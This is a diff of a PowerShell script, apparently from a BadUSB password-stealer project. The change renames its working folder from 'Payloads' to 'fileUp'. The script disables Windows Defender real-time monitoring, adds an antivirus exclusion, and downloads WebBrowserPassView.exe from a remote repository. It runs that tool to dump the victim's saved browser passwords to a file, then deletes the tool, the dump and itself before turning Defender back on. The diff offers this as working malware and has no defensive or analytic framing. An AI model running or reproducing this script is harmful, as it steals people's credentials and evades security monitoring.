@@ -1,13 +1,13 @@
 $random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})
 
-mkdir C:/Payloads
+mkdir C:/fileUp
 Set-MpPreference -DisableRealtimeMonitoring 1
-Set-MpPreference -ExclusionPath "C:/Payloads"
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/Payloads/WebBrowserPassView.exe"
+Set-MpPreference -ExclusionPath "C:/fileUp"
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/fileUp/WebBrowserPassView.exe"
 
 Start-Sleep -seconds 3
 
-Set-Location C:\payloads
+Set-Location C:\fileUp
 .\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt
 
 Start-Sleep -seconds 15
@@ -19,7 +19,7 @@ Start-Sleep -seconds 1
 Remove-Item WebBrowserPassView.exe
 Remove-Item passwords-$env:UserName$random.txt
 cd..
-Remove-Item payloads
+Remove-Item fileUp
 Remove-Item $env:temp\passview.ps1
 
 Set-MpPreference -DisableRealtimeMonitoring 0
